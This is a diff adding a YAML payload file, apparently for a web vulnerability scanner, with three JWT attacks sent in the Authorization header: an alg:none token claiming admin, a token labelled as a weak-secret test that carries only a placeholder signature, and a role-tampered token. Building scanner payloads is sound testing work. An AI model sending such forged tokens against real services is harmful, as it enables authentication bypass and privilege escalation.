@@ -1,0 +1,36 @@
+id: jwt-manip
+name: JWT manipulation
+context:
+  technologies: ["JWT"]
+  headers: ["Authorization: Bearer eyJ"]
+
+payloads:
+  - value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImN5d2ViIiwiYWRtaW4iOnRydWV9."
+    detect: { status_change: true }
+    id: jwt-none-01
+    title: "JWT — alg:none signature bypass"
+    severity: critical
+    cwe: CWE-347
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+
+  - value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImN5d2ViIiwiYWRtaW4iOnRydWV9.dummysig"
+    detect: { status_change: true }
+    id: jwt-weak-01
+    title: "JWT — weak secret key (common signing key)"
+    severity: high
+    cwe: CWE-347
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+
+  - value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.dummysig"
+    detect: { status_change: true }
+    id: jwt-role-01
+    title: "JWT — role escalation via payload tampering"
+    severity: critical
+    cwe: CWE-285
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
